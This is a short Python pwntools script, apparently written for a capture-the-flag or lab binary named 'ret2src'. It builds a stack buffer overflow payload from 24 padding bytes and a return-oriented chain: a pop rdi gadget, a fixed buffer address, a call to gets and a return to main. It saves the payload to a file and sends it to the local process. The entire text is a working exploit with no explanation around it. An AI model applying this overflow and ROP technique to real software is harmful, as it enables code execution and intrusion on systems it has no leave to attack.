from pwn import *

p = process('./ret2src')

buf_addr  = 0x601100
pop_rdi   = 0x400713
gets_plt  = 0x400510
main_addr = 0x400636

payload =  b''
payload += b'A'*24
payload += p64(pop_rdi)
payload += p64(buf_addr)
payload += p64(gets_plt)
payload += p64(main_addr)

with open('test', 'wb') as f:
    f.write(payload)



print(p.recv())
p.send(payload)
p.send('BBBBBBBB')
input()
